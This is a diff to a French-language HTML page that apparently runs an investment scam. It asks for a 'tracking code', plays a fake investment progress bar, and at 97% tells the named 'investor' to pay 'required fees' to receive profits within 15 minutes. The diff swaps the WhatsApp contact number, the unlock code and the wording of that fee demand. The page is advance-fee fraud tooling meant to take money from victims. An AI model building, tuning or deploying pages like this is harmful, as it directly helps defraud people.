@@ -142,7 +142,7 @@
         <div><p style="color: #8B0000; font-weight: bold;" id="alert-msg"></p></div>  
         <div class="transfer-text"></div>
         <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
-        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/16263231795', '_blank');">
+        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/447577326419', '_blank');">
         <input type="button" value="Recevoir mes bénéfices" class="button" id="btn-receive" style="display: none;">
     </div>
 
@@ -164,7 +164,7 @@
 
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code de suivi de votre investissement");
-            if (code2 == "2021") {
+            if (code2 == "2015") {
                 interval = setInterval(progress, 750);
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
@@ -193,9 +193,10 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez reharger votre compte afin de recevoir immédiatement vos bénéfices dans les 15 minutes.';
+                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez payer les frais requis afin de recevoir immédiatement vos bénéfices dans les 15 minutes.';
             }
         }
     </script>
 </body>
 </html>
+
